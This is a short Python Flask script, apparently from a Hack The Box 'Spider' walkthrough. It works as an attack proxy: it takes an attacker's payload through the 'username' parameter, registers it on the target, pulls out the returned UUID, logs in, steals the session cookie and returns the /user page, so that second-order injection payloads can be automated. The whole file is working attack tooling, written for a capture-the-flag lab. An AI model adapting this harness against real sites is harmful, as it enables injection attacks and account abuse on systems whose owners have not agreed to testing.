from flask import Flask
from flask import request
import uuid
import requests
import re

app = Flask(__name__)

@app.route('/')
def index():
    uname=request.args.get('username') 
    #Getting payload from attacker as a GET username parameter
    #print(uname)
    post_data_reg={"username": uname,"confirm_username": uname,"password": "12345a","confirm_password": "12345a"}
    #Creating a post data payload in json format
    r1= requests.post('http://spider.htb/register', data=post_data_reg)
    #Sending Registration request
    uuid = re.findall(r"[\w]{8}-[\w]{4}-[\w]{4}-[\w]{4}-[\w]{12}", r1.text)
    #finding and filtering uuid in http response of registration using regular expression
    #print(str(uuid[0]))
    #print(r1.text)
    #return r1.text
    post_data_login={"username":str(uuid[0]),"password":"12345a"}
    #Creating post data payload for login request
    r2= requests.post('http://spider.htb/login', data=post_data_login)
    #Sending login request
    #print(r2.headers)
    #print(type(r2.headers['Set-Cookie']))
    #print(r2.headers['Set-Cookie'].split(';'))
    #print(r2.headers['Set-Cookie'].split(';')[0])
    cookie=str(r2.headers['Set-Cookie'].split(';')[0])
    #Filtering out session cookie required for user info request
    #print(cookie)
    #print(r2.text)
    custom_header = {"Cookie": cookie}
    r3= requests.get('http://spider.htb/user', headers = custom_header)
    #Sedning Get request to /user with user session cookie
    return r3.text
    #Sedning the http response of user info page back to browser
app.run(host='0.0.0.0', port=81)